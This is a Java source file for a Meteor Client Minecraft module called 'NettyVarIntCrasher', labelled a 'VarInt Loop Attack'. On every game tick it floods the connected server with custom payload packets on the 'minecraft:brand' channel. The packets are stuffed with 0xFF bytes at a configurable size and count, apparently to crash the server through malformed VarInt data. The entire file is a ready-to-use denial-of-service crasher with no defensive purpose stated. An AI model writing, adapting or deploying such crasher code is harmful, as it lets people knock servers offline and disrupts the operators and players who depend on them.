package com.hieu.client.modules.crashers;

import com.hieu.client.Main;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;
import java.util.Arrays;

public class NettyVarIntCrasher extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .defaultValue(20)
        .min(1)
        .sliderMax(100)
        .build()
    );

    private final Setting<Integer> payloadSize = sgGeneral.add(new IntSetting.Builder()
        .name("payload-size")
        .defaultValue(1000)
        .min(1)
        .sliderMax(30000)
        .build()
    );

    public static final CustomPayload.Id<VarIntPayload> PAYLOAD_ID = new CustomPayload.Id<>(Identifier.of("minecraft", "brand"));
    
    public static final PacketCodec<PacketByteBuf, VarIntPayload> CODEC = CustomPayload.codecOf(
        VarIntPayload::write, 
        VarIntPayload::new
    );

    public NettyVarIntCrasher() {
        super(Main.CRASH_GROUP, "netty-varint-crasher", "VarInt Loop Attack.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.getNetworkHandler() == null) return;

        byte[] maliciousBytes = new byte[payloadSize.get()];
        Arrays.fill(maliciousBytes, (byte) 0xFF); 

        for (int i = 0; i < amount.get(); i++) {
            try {
                mc.getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new VarIntPayload(maliciousBytes)));
            } catch (Exception ignored) {}
        }
    }

    private record VarIntPayload(byte[] data) implements CustomPayload {
        public VarIntPayload(PacketByteBuf buf) {
            this(buf.readByteArray());
        }

        private void write(PacketByteBuf buf) {
            buf.writeBytes(data);
        }

        @Override
        public CustomPayload.Id<? extends CustomPayload> getId() {
            return PAYLOAD_ID;
        }
    }
}
